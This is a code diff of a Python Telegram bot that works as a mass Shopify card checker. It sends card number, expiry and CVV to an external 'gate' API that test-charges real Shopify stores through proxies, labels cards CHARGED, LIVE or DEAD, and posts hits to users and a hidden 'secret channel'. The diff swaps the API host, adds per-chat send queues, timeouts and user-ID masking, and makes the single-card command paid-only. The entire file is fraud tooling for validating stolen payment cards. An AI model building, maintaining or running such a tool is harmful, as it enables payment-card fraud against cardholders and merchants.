@@ -2,7 +2,7 @@
 sh.py  v28  —  /sh single-card + /msh mass Shopify checker
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Framework : python-telegram-bot v21
-API       : https://laxman.up.railway.app/shopii
+API       : https://lucifer.up.railway.app/shopii
             GET ?cc=NUM|MM|YY|CVV&site=DOMAIN&proxy=http://ip:port
             site  = plain domain, NO https:// prefix
             proxy = http://ip:port  (WITH http:// prefix)
@@ -88,7 +88,7 @@ from config import (
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # CONSTANTS
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-API_URL       = "https://laxman.up.railway.app/shopii"
+API_URL       = "https://lucifer.up.railway.app/shopii"
 BOT_CHANNEL   = CHANNEL_LINK
 DEV_LINK_HTML = f'<a href="{BOT_CHANNEL}">{BOT_NAME}</a>'
 
@@ -99,14 +99,14 @@ EXTRA_CHARGED_GROUP_ID = -0  # extra charged log
 SECRET_CHANNEL_ID   = -1003968669478
 SECRET_CHANNEL_LINK = "https://t.me/+BfUGjEXaySM2MDc0"
 # ── Result card buttons ─────────────────────────────────────────────────────
-BOT_USERNAME_LINK   = "https://t.me/Batxchk_bot"
+BOT_USERNAME_LINK   = "https://t.me/+Gjwke5Yc1ddhYmZk"
 BOT_PLANS_LINK      = "https://t.me/Batxchk_bot?start=plans"  # deep-links → /plans
 MY_CHANNEL_LINK     = CHANNEL_LINK                                 # main channel
 
 SH_COOLDOWN    = 25
 
 # ── Speed / concurrency settings ───────────────────────────────────────────
-# laxman.up.railway.app is a shared Railway app — it can't handle hundreds of
+# lucifer.up.railway.app is a shared Railway app — it can't handle hundreds of
 # simultaneous connections.  Too many concurrent calls → 502/503 errors →
 # real bank responses (PCI_ERROR, GENERIC_ERROR, etc.) never arrive →
 # cards falsely marked DEAD.
@@ -127,6 +127,7 @@ BUTTON_LOCK    = 30
 
 _CB_RESULT = "mshr"
 _CB_STOP   = "mshs"
+MSH_SESSION_TTL = 3600
 
 MSH_SESSIONS: dict  = {}
 _BIN_CACHE:   dict  = {}
@@ -336,7 +337,7 @@ def _is_success_response(resp: str) -> bool:
 
 def classify_response(resp: str) -> str:
     """
-    Classify a response string from laxman.up.railway.app.
+    Classify a response string from lucifer.up.railway.app.
     Returns one of: CHARGED | TDS | LIVE | DEAD | RETRY | ERROR
 
       CHARGED / TDS / LIVE / DEAD  →  final verdict, stop checking this card
@@ -759,7 +760,7 @@ def extract_cards(text: str) -> list:
 def _parse_response_field(data: dict) -> str:
     """Extract the human-readable response string from the API JSON.
 
-   laxman.up.railway.app returns:
+    lucifer.up.railway.app returns:
       {"Status": true/false, "Response": "ORDER_PAID"|"CARD_DECLINED"|...,
        "Gateway": "shopify_payments", "Price": "0.98", "Currency": "USD", ...}
 
@@ -813,9 +814,9 @@ def _normalise_gateway(raw: str) -> str:
 
 async def _call_api(card: str, site: str, proxy: Optional[str],
                     timeout: float = SITE_TIMEOUT) -> tuple:
-    """Call the laxman.up.railway.app checker API.
+    """Call the lucifer.up.railway.app checker API.
 
-    Endpoint :https://laxman.up.railway.app/shopii
+    Endpoint : https://lucifer.up.railway.app/shopii
     Method   : GET
     Params   :
         cc    = CARDNUM|MM|YY|CVV   (pipe-separated, all in one param)
@@ -838,7 +839,7 @@ async def _call_api(card: str, site: str, proxy: Optional[str],
         502/503 responses — hiding real bank results (PCI_ERROR, etc.).
     """
     site_clean = _strip_scheme(site)      # drop any https:// prefix
-    # New API (laxman.up.railway.app) loads proxies from px.txt server-side
+    # New API (lucifer.up.railway.app) loads proxies from px.txt server-side
     # automatically — no &proxy= param needed or accepted.
     url = f"{API_URL}?cc={card}&site={site_clean}"
 
@@ -1015,7 +1016,7 @@ async def _check_card_with_retry(
                     continue
 
                 # HTTP-level error from the API server itself (not the Shopify site).
-                # 502/503/504 mean the gate API (laxman.up.railway.app) is down —
+                # 502/503/504 mean the gate API (lucifer.up.railway.app) is down —
                 # retrying with a different Shopify site won't help.
                 if http_st and http_st not in (200,):
                     local_dead.add(site)
@@ -1301,6 +1302,12 @@ def _uurl(user) -> str:
     return f"tg://user?id={user.id}"
 
 
+def _masked_user_id(user_id: int) -> str:
+    """Show only the first four digits of a Telegram user ID."""
+    value = str(user_id)
+    return value[:4] + ("*" * max(0, len(value) - 4))
+
+
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # STICKER RESOLVER  —  the ONLY approach that works for ALL
 # users regardless of whether the bot has Telegram Premium.
@@ -1356,31 +1363,65 @@ async def _send_as_media(bot, chat_id, emoji_id: str, caption: str,
 
         for attempt in range(4):
             try:
-                await bot.send_message(
-                    chat_id=chat_id,
-                    text=plain_text,
-                    entities=ents if ents else None,
-                    reply_markup=reply_markup,
-                    disable_web_page_preview=True,
-                    disable_notification=disable_notification,
-                    reply_to_message_id=reply_to_message_id,
+                await asyncio.wait_for(
+                    bot.send_message(
+                        chat_id=chat_id,
+                        text=plain_text,
+                        entities=ents if ents else None,
+                        reply_markup=reply_markup,
+                        disable_web_page_preview=True,
+                        disable_notification=disable_notification,
+                        reply_to_message_id=reply_to_message_id,
+                    ),
+                    timeout=45.0,
                 )
-                return
+                return True
             except RetryAfter as exc:
                 if attempt == 3:
-                    raise
+                    return False
                 wait_time = float(getattr(exc, "retry_after", 3)) + 1
                 logging.warning(f"[MEDIA] Rate limited for chat_id={chat_id}. Sleeping {wait_time}s...")
                 await asyncio.sleep(wait_time)
-            except Exception as exc:
+            except BadRequest as exc:
                 logging.warning(f"[MEDIA] send_message to {chat_id} failed: {exc}")
                 if reply_to_message_id:
                     reply_to_message_id = None
                     continue
-                return
+                try:
+                    await asyncio.wait_for(
+                        bot.send_message(
+                            chat_id=chat_id,
+                            text=plain_text,
+                            disable_web_page_preview=True,
+                            disable_notification=disable_notification,
+                        ),
+                        timeout=45.0,
+                    )
+                    return True
+                except Exception as fallback_exc:
+                    logging.warning(
+                        f"[MEDIA] plain-text fallback to {chat_id} failed: {fallback_exc}"
+                    )
+                    return False
+            except Forbidden as exc:
+                logging.warning(f"[MEDIA] chat unavailable {chat_id}: {exc}")
+                return False
+            except (TimedOut, NetworkError, asyncio.TimeoutError) as exc:
+                logging.warning(
+                    f"[MEDIA] temporary failure to {chat_id}, "
+                    f"attempt {attempt + 1}/4: {exc}"
+                )
+                if attempt == 3:
+                    return False
+                await asyncio.sleep(_DM_RETRY_DELAYS[min(attempt, 3)])
+            except Exception as exc:
+                logging.warning(f"[MEDIA] unexpected send failure to {chat_id}: {exc}")
+                if attempt == 3:
+                    return False
+                await asyncio.sleep(_DM_RETRY_DELAYS[min(attempt, 3)])
     except Exception as exc:
         logging.warning(f"[MEDIA] _send_as_media failed for {chat_id}: {exc}")
-        raise
+        return False
 
 
 def _plan_eid(plan: str) -> str:
@@ -1781,8 +1822,59 @@ async def _update_progress(bot, sid: str, force: bool = False):
         )
         sess["last_text"]   = text
         sess["last_update"] = now
-    except Exception:
-        pass
+    except BadRequest as exc:
+        if "message is not modified" not in str(exc).lower():
+            logging.warning("[MSH] progress edit rejected sid=%s: %s", sid, exc)
+    except Exception as exc:
+        logging.warning("[MSH] progress edit failed sid=%s: %s", sid, exc)
+
+
+def _schedule_progress(bot, sid: str) -> None:
+    """Coalesce any number of card updates into at most one edit per second."""
+    sess = MSH_SESSIONS.get(sid)
+    if not sess:
+        return
+    current = sess.get("progress_task")
+    if current and not current.done():
+        return
+
+    async def _delayed_update():
+        try:
+            active = MSH_SESSIONS.get(sid)
+            if not active:
+                return
+            delay = max(0.0, 1.0 - (time.time() - active.get("last_update", 0)))
+            if delay:
+                await asyncio.sleep(delay)
+            await _update_progress(bot, sid)
+        except asyncio.CancelledError:
+            raise
+        finally:
+            active = MSH_SESSIONS.get(sid)
+            if active and active.get("progress_task") is asyncio.current_task():
+                active["progress_task"] = None
+
+    sess["progress_task"] = asyncio.create_task(_delayed_update())
+
+
+async def _finish_progress(bot, sid: str) -> None:
+    """Cancel a pending coalesced edit and publish one final state."""
+    sess = MSH_SESSIONS.get(sid)
+    if not sess:
+        return
+    task = sess.get("progress_task")
+    if task and not task.done():
+        task.cancel()
+        await asyncio.gather(task, return_exceptions=True)
+    sess["progress_task"] = None
+    await _update_progress(bot, sid, force=True)
+
+
+async def _expire_msh_session(sid: str) -> None:
+    await asyncio.sleep(MSH_SESSION_TTL)
+    sess = MSH_SESSIONS.get(sid)
+    if sess and sess.get("status") in ("FINISHED", "STOPPED"):
+        MSH_SESSIONS.pop(sid, None)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1844,44 +1936,65 @@ def _make_result_file(sess: dict, kind: str) -> tuple:
 # seconds.  Sending each DM immediately causes 429 RetryAfter
 # errors that silently drop notifications.
 #
-# Fix: all DMs to USER chats go through _DM_QUEUE.  A single
-# background worker (_dm_worker) dequeues them one-at-a-time,
-# honouring retry_after when Telegram asks us to back off.
-# Group/channel posts bypass the queue (they're less frequent
-# and each goes to a different chat, so per-chat rate limits
-# are not hit as hard).
+# Fix: every destination gets its own queue and worker. Messages remain
+# ordered within one chat, while a busy channel or user cannot delay
+# another user's charged notification.
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-_DM_QUEUE: "asyncio.Queue | None" = None
-_DM_WORKER_TASK: "asyncio.Task | None" = None
+_DM_QUEUES: dict[int, asyncio.Queue] = {}
+_DM_WORKER_TASKS: dict[int, asyncio.Task] = {}
 _DM_MAX_ATTEMPTS = 6
 _DM_RETRY_DELAYS = (1.0, 2.0, 4.0, 8.0, 15.0)
+_DM_SEND_TIMEOUT = 45.0
+_DM_WORKER_IDLE_TIMEOUT = 60.0
 
-def _get_dm_queue() -> "asyncio.Queue":
-    """Return (lazily creating) the global DM queue."""
-    global _DM_QUEUE
-    if _DM_QUEUE is None:
-        _DM_QUEUE = asyncio.Queue()
-    return _DM_QUEUE
+def _get_dm_queue(chat_id: int) -> asyncio.Queue:
+    """Return a dedicated queue so one busy chat cannot block other users."""
+    queue = _DM_QUEUES.get(chat_id)
+    if queue is None:
+        queue = asyncio.Queue()
+        _DM_QUEUES[chat_id] = queue
+    return queue
 
 
-async def _dm_worker() -> None:
-    """Consume reusable DM jobs one at a time without dropping flood-limited hits."""
-    q = _get_dm_queue()
-    while True:
-        try:
-            job = await q.get()
+async def _dm_worker(chat_id: int) -> None:
+    """Consume one chat's queue without delaying deliveries to other chats."""
+    queue = _get_dm_queue(chat_id)
+    try:
+        while True:
+            try:
+                job = await asyncio.wait_for(
+                    queue.get(),
+                    timeout=_DM_WORKER_IDLE_TIMEOUT,
+                )
+            except asyncio.TimeoutError:
+                if queue.empty():
+                    return
+                continue
+
             try:
                 await _deliver_queued_dm(job)
+            except Exception as exc:
+                logging.exception(
+                    "[DM_QUEUE] worker error uid=%s: %s",
+                    chat_id, exc,
+                )
             finally:
-                q.task_done()
-            # Polite inter-message gap — 1.1 s keeps us under 1 msg/s per chat
-            await asyncio.sleep(1.1)
-        except asyncio.CancelledError:
-            logging.info("[DM_QUEUE] worker cancelled")
-            return
-        except Exception as exc:
-            logging.error(f"[DM_QUEUE] unexpected error: {exc}")
+                queue.task_done()
+
+            # Telegram's per-chat limit is approximately one message/second.
+            await asyncio.sleep(1.05)
+    except asyncio.CancelledError:
+        logging.info("[DM_QUEUE] worker cancelled uid=%s", chat_id)
+        raise
+    finally:
+        current = asyncio.current_task()
+        if _DM_WORKER_TASKS.get(chat_id) is current:
+            _DM_WORKER_TASKS.pop(chat_id, None)
+        if queue.empty():
+            _DM_QUEUES.pop(chat_id, None)
+        else:
+            _ensure_dm_worker(chat_id)
 
 
 async def _deliver_queued_dm(job: dict) -> None:
@@ -1896,13 +2009,16 @@ async def _deliver_queued_dm(job: dict) -> None:
 
     for attempt in range(1, _DM_MAX_ATTEMPTS + 1):
         try:
-            await job["bot"].send_message(
-                chat_id=job["chat_id"],
-                text=plain_text,
-                entities=entities or None,
-                reply_markup=job.get("reply_markup"),
-                disable_web_page_preview=True,
-                disable_notification=job.get("disable_notification", False),
+            await asyncio.wait_for(
+                job["bot"].send_message(
+                    chat_id=job["chat_id"],
+                    text=plain_text,
+                    entities=entities or None,
+                    reply_markup=job.get("reply_markup"),
+                    disable_web_page_preview=True,
+                    disable_notification=job.get("disable_notification", False),
+                ),
+                timeout=_DM_SEND_TIMEOUT,
             )
             return
         except RetryAfter as exc:
@@ -1931,7 +2047,42 @@ async def _deliver_queued_dm(job: dict) -> None:
                 job["chat_id"], attempt, _DM_MAX_ATTEMPTS, delay, exc,
             )
             await asyncio.sleep(delay)
-        except (Forbidden, BadRequest) as exc:
+        except BadRequest as exc:
+            # Custom emoji/entity formatting can occasionally be rejected by
+            # Telegram. Deliver the readable result instead of dropping it.
+            try:
+                await asyncio.wait_for(
+                    job["bot"].send_message(
+                        chat_id=job["chat_id"],
+                        text=plain_text,
+                        disable_web_page_preview=True,
+                        disable_notification=job.get("disable_notification", False),
+                    ),
+                    timeout=_DM_SEND_TIMEOUT,
+                )
+                logging.warning(
+                    "[DM_QUEUE] Delivered plain-text fallback uid=%s after: %s",
+                    job["chat_id"], exc,
+                )
+                return
+            except Forbidden as fallback_exc:
+                logging.warning(
+                    "[DM_QUEUE] User unavailable uid=%s: %s",
+                    job["chat_id"], fallback_exc,
+                )
+                return
+            except Exception as fallback_exc:
+                if attempt >= _DM_MAX_ATTEMPTS:
+                    logging.error(
+                        "[DM_QUEUE] Fallback exhausted uid=%s: %s",
+                        job["chat_id"], fallback_exc,
+                    )
+                    return
+                delay = _DM_RETRY_DELAYS[
+                    min(attempt - 1, len(_DM_RETRY_DELAYS) - 1)
+                ]
+                await asyncio.sleep(delay)
+        except Forbidden as exc:
             logging.warning(
                 "[DM_QUEUE] Permanent Telegram rejection uid=%s: %s",
                 job["chat_id"], exc,
@@ -1945,19 +2096,19 @@ async def _deliver_queued_dm(job: dict) -> None:
             return
 
 
-def _ensure_dm_worker() -> None:
-    """Start the DM worker task if it isn't already running."""
-    global _DM_WORKER_TASK
-    if _DM_WORKER_TASK is None or _DM_WORKER_TASK.done():
-        _DM_WORKER_TASK = asyncio.ensure_future(_dm_worker())
+def _ensure_dm_worker(chat_id: int) -> None:
+    """Start or restart the independent worker for one destination."""
+    task = _DM_WORKER_TASKS.get(chat_id)
+    if task is None or task.done():
+        _DM_WORKER_TASKS[chat_id] = asyncio.create_task(_dm_worker(chat_id))
 
 
 async def _enqueue_dm(bot, chat_id: int, eid: str, caption: str,
                       parse_mode: str = "HTML", reply_markup=None,
                       disable_notification: bool = False) -> None:
     """Push a DM send-job onto the flood-safe queue."""
-    _ensure_dm_worker()
-    await _get_dm_queue().put({
+    queue = _get_dm_queue(chat_id)
+    await queue.put({
         "bot": bot,
         "chat_id": chat_id,
         "emoji_id": eid,
@@ -1966,6 +2117,7 @@ async def _enqueue_dm(bot, chat_id: int, eid: str, caption: str,
         "reply_markup": reply_markup,
         "disable_notification": disable_notification,
     })
+    _ensure_dm_worker(chat_id)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1995,20 +2147,19 @@ async def _send_hit(bot, user, text: str, verdict: str,
         return
 
     eid   = get_random_charged_emoji()
-    ulink = _user_link(user, hide)
-    resp_disp = escape(resp) if resp else "ORDER_PAID"
+    resp_disp = "ORDER_PAID"
+    amount_txt = _fmt_price(price, currency)
+    masked_uid = _masked_user_id(user.id)
+    gate_txt = f"Gate ➛ Shopify • {amount_txt}"
 
-    gate_txt = f"Gate ➛ Shopify • {_fmt_price(price, currency)}"
-
-    plan_eid = _plan_eid(plan)
     log_html = (
-        f'<b>HIT ➛ CHARGED '
-        f'<tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n'
-        f'<b>{gate_txt}</b>\n'
-        f'<b><tg-emoji emoji-id="{HIT_RESP_EMOJI_ID}">✅</tg-emoji>'
-        f' <code>{resp_disp}</code></b>\n'
-        f'<b>User ➛ {ulink}'
-        f' <tg-emoji emoji-id="{plan_eid}">⭐</tg-emoji></b>'
+        f'<b>🚨 NEW HIT! 🚨</b>\n'
+        f'<b>💰 CHARGED <tg-emoji emoji-id="{eid}">💎</tg-emoji></b>\n'
+        f'<b>➖➖➖➖➖➖➖➖➖</b>\n'
+        f'<b>🏪 Gate: Shopify</b>\n'
+        f'<b>💵 Amount: {amount_txt}</b>\n'
+        f'<b>🟢 Status: <code>{resp_disp}</code></b>\n'
+        f'<b>👤 User: <code>{masked_uid}</code> ⭐</b>'
     )
 
     log_kb = RawMarkup([[
@@ -2055,6 +2206,7 @@ async def _send_hit(bot, user, text: str, verdict: str,
     # ── 4. Secret channel — CHARGED only, never LIVE/TDS ─────────────────────
     if SECRET_CHANNEL_ID and verdict == "CHARGED":
         try:
+            ulink = _user_link(user, hide)
             bin_s  = _bin_str(bin_data)
             sc_lbl = "CHARGED 💎"
             sc_html = (
@@ -2090,6 +2242,7 @@ def create_msh_session(sid, chat_id, user_id, msg_id, user_msg_id,
         "charged_cards": [], "live_cards":  [],
         "dead_cards":    [], "error_cards": [], "tds_cards": [],
         "tasks": [], "last_text": "", "last_update": 0,
+        "progress_task": None, "cleanup_task": None,
         "user_obj": user_obj, "plan": plan,
         "hide": bool(hide),
         "plan_eid": _plan_eid(plan),
@@ -2164,30 +2317,27 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies, 
                     _ud_msh   = _ud_store.setdefault(str(user.id), {})
                     _ud_msh["total_charged"] = _ud_msh.get("total_charged", 0) + 1
                     hide = bool(_ud_msh.get("hide", hide))
-                    asyncio.create_task(db.save_user_stats_now(user.id, _ud_msh))  # persist total_charged
+                    db.schedule_user_stats_save(user.id, _ud_msh)
                 _dm_html = build_result_msg(card_fmt, resp, verdict, bin_data,
                                             price, currency, elapsed, user, plan,
                                             hide=hide)
-                asyncio.create_task(_send_hit(
+                await _send_hit(
                     bot, user, _dm_html, "CHARGED",
                     card=card_fmt, bin_data=bin_data, price=price, currency=currency,
                     plan=plan, resp=raw_resp,
                     hide=hide,
-                ))
-                asyncio.create_task(_update_progress(bot, sid, force=True))
+                )
 
             elif verdict == "TDS":
                 sess["approved"] += 1
                 sess["live_cards"].append(rec)
                 sess["tds_cards"].append(rec)
                 # No DM / hit-log for TDS — user collects via Live file button
-                asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "LIVE":
                 sess["approved"] += 1
                 sess["live_cards"].append(rec)
                 # No DM / hit-log for LIVE — user collects via Live file button
-                asyncio.create_task(_update_progress(bot, sid, force=True))
 
             elif verdict == "DEAD":
                 sess["dead"] += 1
@@ -2198,7 +2348,7 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies, 
                 sess["error_cards"].append(rec)
 
             # Update progress after every single card so user sees real-time counts
-            asyncio.create_task(_update_progress(bot, sid))
+            _schedule_progress(bot, sid)
 
     # Launch ALL card tasks immediately (no stagger) — the per-session semaphore
     # (asyncio.Semaphore(MAX_CONCURRENT) = 25) inside each worker controls how
@@ -2215,10 +2365,12 @@ async def run_mass_batch(bot, sid, valid_cards, user, plan, all_sites, proxies, 
         sess["tasks"].append(t)
 
     await asyncio.gather(*sess["tasks"], return_exceptions=True)
+    sess["tasks"] = []
 
     if MSH_SESSIONS.get(sid, {}).get("status") == "CHECKING":
         MSH_SESSIONS[sid]["status"] = "FINISHED"
-    await _update_progress(bot, sid, force=True)
+    await _finish_progress(bot, sid)
+    sess["cleanup_task"] = asyncio.create_task(_expire_msh_session(sid))
 
     if bot_data is not None:
         ud = bot_data.setdefault("user_data", {}).setdefault(str(user.id), {})
@@ -2258,17 +2410,16 @@ async def cb_msh_result(update: Update, context: ContextTypes.DEFAULT_TYPE):
                f"<b>Gate ➳ Shopify Mass</b>")
     try:
         await context.bot.send_document(
-            chat_id=q.message.chat_id,
+            chat_id=sess["user_id"],
             document=InputFile(buf, filename=fname),
             caption=caption, parse_mode="HTML",
-            reply_to_message_id=sess.get("user_msg_id"),
         )
     except Exception as e:
         logging.error(f"[MSH] send_document: {e}")
         try:
             buf.seek(0)
             await context.bot.send_document(
-                chat_id=q.message.chat_id,
+                chat_id=sess["user_id"],
                 document=InputFile(buf, filename=fname),
                 caption=caption, parse_mode="HTML",
             )
@@ -2294,7 +2445,7 @@ async def cb_msh_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not t.done(): t.cancel()
     await q.answer("🛑 Stopped.")
     sess["last_text"] = ""
-    await _update_progress(context.bot, sid, force=True)
+    await _finish_progress(context.bot, sid)
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -2344,17 +2495,11 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     premium = _is_premium(ud, user.id)
     if not premium:
-        if ud.get("credits", 0) <= 0:
-            await update.message.reply_text(
-                "❌ <b>No credits.</b> Use /buy to upgrade.", parse_mode="HTML"); return
-        cd_map = context.bot_data.setdefault("sh_cd", {})
-        rem    = SH_COOLDOWN - (time.time() - cd_map.get(user.id, 0))
-        if rem > 0:
-            await update.message.reply_text(
-                f"⏳ <b>Cooldown:</b> wait <b>{int(rem)}s</b>",
-                parse_mode="HTML"); return
-        cd_map[user.id] = time.time()
-        ud["credits"]   = max(0, ud.get("credits", 1) - 1)
+        await update.message.reply_text(
+            "🔒 <b>Premium access required.</b>\nUse /buy to activate a plan.",
+            parse_mode="HTML",
+        )
+        return
 
     plan = ud.get("plan", "TRIAL")
 
@@ -2421,7 +2566,7 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Track lifetime charged count for /me
         _ud_sh = _get_ud(user.id, context)
         _ud_sh["total_charged"] = _ud_sh.get("total_charged", 0) + 1
-        asyncio.create_task(db.save_user_stats_now(user.id, _ud_sh))  # persist total_charged
+        db.schedule_user_stats_save(user.id, _ud_sh)
     elif verdict in ("LIVE", "TDS"):
         _cmd_eid = get_random_live_emoji()
     else:
@@ -2441,22 +2586,30 @@ async def cmd_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # FIX 1: reply to the original command message so result is threaded correctly.
     # FIX 2: skip_dm=True so _send_hit doesn't also send to user.id — that would
     #         produce two identical cards in any private chat.
-    await _send_as_media(context.bot, update.effective_chat.id, _cmd_eid,
-                         caption=res_html, parse_mode="HTML", reply_markup=kb,
-                         reply_to_message_id=update.message.message_id)
+    delivered_in_chat = await _send_as_media(
+        context.bot,
+        update.effective_chat.id,
+        _cmd_eid,
+        caption=res_html,
+        parse_mode="HTML",
+        reply_markup=kb,
+        reply_to_message_id=update.message.message_id,
+    )
 
     if verdict in ("CHARGED", "LIVE", "TDS"):
         # skip_dm only when checking in a PRIVATE chat (the result is already
         # visible there). In a group the result appears in the group, so the
         # user still needs a personal DM with the full charged card.
-        _in_private = (update.effective_chat.id == user.id)
-        asyncio.create_task(_send_hit(
+        _in_private = (
+            update.effective_chat.id == user.id and delivered_in_chat
+        )
+        await _send_hit(
             context.bot, user, res_html, verdict,
             card=card, bin_data=bin_data, price=price, currency=currency,
             plan=plan, resp=resp,
             skip_dm=_in_private,
             hide=hide,
-        ))
+        )
 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
